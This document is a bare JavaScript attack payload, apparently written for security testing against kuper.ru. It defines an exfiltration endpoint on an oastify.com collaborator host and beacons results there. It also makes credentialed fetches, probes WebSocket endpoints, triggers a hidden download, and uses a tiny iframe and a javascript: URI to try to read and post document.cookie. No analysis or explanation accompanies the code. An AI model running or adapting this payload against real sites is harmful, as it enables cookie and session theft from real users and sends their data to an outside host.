alert('step 3');
var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';

function send(path, data) {
    try {
        var body = typeof data === 'string' ? data : JSON.stringify(data);
        navigator.sendBeacon(EXFIL + '/' + path, body);
    } catch(e) {
        new Image().src = EXFIL + '/' + path + '?e=' + encodeURIComponent(e.message);
    }
}

(function nocorsFetch() {
    setTimeout(function() {
        try {
            // Делаем запрос к kuper.ru через наш сервер-прокси
            // Запрос К kuper.ru пойдёт с cookies
            fetch('https://kuper.ru/', {
                credentials: 'include',
                mode: 'no-cors'
            }).then(function(r) {
                send('nocors-result', { type: r.type, status: r.status, redirected: r.redirected });
            }).catch(function(e) {
                send('nocors-err', { err: e.message });
            });
        } catch(e) {}
    }, 7000);
})();


(function wsCheck() {
    setTimeout(function() {
        var wsUrls = [
            'wss://kuper.ru/cable',
            'wss://kuper.ru/ws',
            'wss://api.kuper.ru/cable',
            'wss://api.kuper.ru/ws',
            'wss://stf-gw.kuper.ru/ws'
        ];

        wsUrls.forEach(function(url, i) {
            try {
                var ws = new WebSocket(url);
                ws.onopen = function() {
                    send('ws-OPEN-' + i, { url: url });
                    ws.close();
                };
                ws.onerror = function() {
                    send('ws-err-' + i, { url: url });
                };
                ws.onclose = function(e) {
                    send('ws-close-' + i, { url: url, code: e.code, reason: e.reason });
                };
            } catch(e) {
                send('ws-ex-' + i, { url: url, err: e.message });
            }
        });
    }, 8000);
})();


(function downloadTrigger() {
    setTimeout(function() {
        try {
            var a = document.createElement('a');
            a.href = 'https://kuper.ru/favicon.ico';
            a.download = 'test.ico';
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            send('download-triggered', { url: a.href });
        } catch(e) {
            send('download-err', { err: e.message });
        }
    }, 9000);
})();


(function iframeTest() {
    setTimeout(function() {
        try {
            var ifr = document.createElement('iframe');
            ifr.src = 'https://kuper.ru/';
            ifr.style.width = '1px';
            ifr.style.height = '1px';
            document.body.appendChild(ifr);

            // Ждём загрузки и пробуем читать
            setTimeout(function() {
                try {
                    var c = ifr.contentDocument.cookie;
                    send('iframe-COOKIE', { cookie: c });
                } catch(e) {
                    send('iframe-sop', { err: e.message });
                }
                try {
                    // Попытка навигации iframe на javascript: для чтения cookie
                    ifr.contentWindow.location = 'javascript:void(parent.postMessage(document.cookie,"*"))';
                } catch(e) {
                    send('iframe-jsuri', { err: e.message });
                }
            }, 3000);
        } catch(e) {
            send('iframe-err', { err: e.message });
        }
    }, 10000);
})();
